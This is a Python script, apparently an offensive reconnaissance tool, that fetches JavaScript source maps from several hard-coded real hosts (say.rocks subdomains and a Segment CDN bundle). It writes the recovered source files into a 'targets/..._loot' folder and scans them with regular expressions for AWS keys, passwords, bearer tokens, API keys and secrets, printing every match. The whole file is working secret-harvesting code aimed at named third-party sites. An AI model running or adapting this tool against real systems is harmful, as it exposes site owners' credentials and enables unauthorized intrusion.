import json
import requests
import os
import re
from colorama import init, Fore, Style

init(autoreset=True)

OUT_DIR = os.path.join(os.getcwd(), "targets", "say_rocks_sourcemap_loot")
os.makedirs(OUT_DIR, exist_ok=True)

URLS = [
    "https://viewer-test.say.rocks/_next/static/chunks/webpack-829afab9189fb9c2.js.map",
    "https://viewer-test.say.rocks/_next/static/chunks/pages/_error-eef45039e9c6d0e0.js.map",
    "https://cdn.segment.com/analytics-next/bundles/schemaFilter.bundle.1b218d13fed021531d4e.js.map",
    "https://viewer.say.rocks/_next/static/chunks/pages/_error-eef45039e9c6d0e0.js.map"
]

patterns = {
    'AWS_KEY': r'AKIA[0-9A-Z]{16}',
    'PASSWORD_VAR': r'(?i)password["\']?\s*[:=]\s*["\']([^"\']+)["\']',
    'BEARER_TOKEN': r'Bearer\s+[A-Za-z0-9\-\._~\+\/]+=*',
    'API_KEY_VAR': r'(?i)api_?key["\']?\s*[:=]\s*["\']([^"\']+)["\']',
    'SECRET_VAR': r'(?i)secret["\']?\s*[:=]\s*["\']([^"\']+)["\']'
}

def analyze():
    print(f"{Fore.CYAN}[*] Iniciando Extractor de SourceMaps Autónomo...")
    for url in URLS:
        print(f"\n{Fore.YELLOW}[>] Vector: {url}")
        try:
            resp = requests.get(url, timeout=15)
            if resp.status_code == 200:
                try:
                    data = resp.json()
                except Exception:
                    print(f"  {Fore.RED}[-] Retorno 200 OK pero no es JSON Válido.")
                    continue
                
                sources = data.get('sources', [])
                contents = data.get('sourcesContent', [])
                
                if not sources or not contents:
                    print(f"  {Fore.RED}[-] No se encontró código fuente (.sources/.sourcesContent) dentro del mapa.")
                    continue
                    
                print(f"  {Fore.GREEN}[+] ¡Bingo! {len(sources)} archivos fuente expuestos. Empezando escaneo profundo...")
                secret_found = False
                
                for i, source_path in enumerate(sources):
                    content = contents[i] if i < len(contents) else ""
                    if not content: continue
                    
                    # SANITIZAR Y GUARDAR RUTA
                    safe_path = source_path.replace("webpack:///", "").replace("..", "_").replace("/", os.sep)
                    clean_path = re.sub(r'[<>:"|?*]', "_", safe_path) # Remover ilegales de windows
                    full_out_path = os.path.join(OUT_DIR, clean_path)
                    
                    try:
                        os.makedirs(os.path.dirname(full_out_path), exist_ok=True)
                        with open(full_out_path, "w", encoding="utf-8") as f:
                            f.write(content)
                    except Exception as e:
                        print(f"    {Fore.RED}[-] Error guardando {clean_path}: {e}")
                    
                    for p_name, p_regex in patterns.items():
                        matches = re.finditer(p_regex, content)
                        for match in matches:
                            secret_found = True
                            print(f"    {Fore.RED}[!] {p_name} detectado -> {source_path}")
                            print(f"        {Fore.WHITE}Match: {match.group(0)[:80]}")
                            
                if not secret_found:
                    print(f"  {Fore.CYAN}[i] Código descargado y empaquetado en {OUT_DIR} sin matches explícitos.")
                    
            else:
                print(f"  {Fore.RED}[-] Request Falló - Estado: {resp.status_code}")
                
        except requests.exceptions.RequestException as e:
            print(f"  {Fore.RED}[-] Request Timeout: {e}")

if __name__ == "__main__":
    analyze()
